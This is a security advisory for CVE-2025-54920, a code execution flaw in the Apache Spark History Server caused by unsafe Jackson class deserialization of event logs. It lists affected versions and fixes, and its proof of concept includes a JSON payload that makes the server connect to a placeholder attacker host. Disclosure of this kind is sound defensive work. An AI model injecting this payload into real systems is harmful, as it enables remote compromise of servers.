# [H] Apache Spark: Spark History Server Code Execution Vulnerability

## Summary
Severity: High
Advisory: GHSA-jwp6-cvj8-fw65
CVE: CVE-2025-54920
CWE: CWE-502
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-jwp6-cvj8-fw65
Type: github-advisory

## Affected
- Maven: `org.apache.spark:spark-core_2.13` — affected >=4.0.0 <4.0.1
- Maven: `org.apache.spark:spark-core_2.13` — affected >=0 <3.5.7
- Maven: `org.apache.spark:spark-core_2.12` — affected >=0 <3.5.7
- Maven: `org.apache.spark:spark-core_2.11` — affected >=0
- Maven: `org.apache.spark:spark-core_2.10` — affected >=0
- Maven: `org.apache.spark:spark-core_2.9.3` — affected >=0

## Details
This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommended to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.

## Summary

Apache Spark 3.5.4 and earlier versions contain a code execution vulnerability in the Spark History Web UI due to overly permissive Jackson deserialization of event log data. This allows an attacker with access to the Spark event logs directory to inject malicious JSON payloads that trigger deserialization of arbitrary classes, enabling command execution on the host running the Spark History Server.

## Details

The vulnerability arises because the Spark History Server uses Jackson polymorphic deserialization with @JsonTypeInfo.Id.CLASS on SparkListenerEvent objects, allowing an attacker to specify arbitrary class names in the event JSON. This behavior permits instantiating unintended classes, such as org.apache.hive.jdbc.HiveConnection, which can perform network calls or other malicious actions during deserialization.

The attacker can exploit this by injecting crafted JSON content into the Spark event log files, which the History Server then deserializes on startup or when loading event logs. For example, the attacker can force the History Server to open a JDBC connection to a remote attacker-controlled server, demonstrating remote command injection capability.

## Proof of Concept:

1. Run Spark with event logging enabled, writing to a writable directory (spark-logs).

2. Inject the following JSON at the beginning of an event log file:

```
{

  "Event": "org.apache.hive.jdbc.HiveConnection",
  "uri": "jdbc:hive2://<IP>:<PORT>/",
  "info": {
    "hive.metastore.uris": "thrift://<IP>:<PORT>"
  }
}
```
3. Start the Spark History Server with logs pointing to the modified directory.

4. The Spark History Server initiates a JDBC connection to the attacker’s server, confirming the injection.

## Impact

An attacker with write access to Spark event logs can execute arbitrary code on the server running the History Server, potentially compromising the entire system.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2025-54920
- https://github.com/apache/spark/pull/51312
- https://github.com/apache/spark/pull/51323
- https://github.com/apache/spark
- https://issues.apache.org/jira/browse/SPARK-52381
- https://lists.apache.org/thread/4y9n0nfj7m68o2hpmoxgc0y7dm1lo02s
- http://www.openwall.com/lists/oss-security/2026/03/13/4
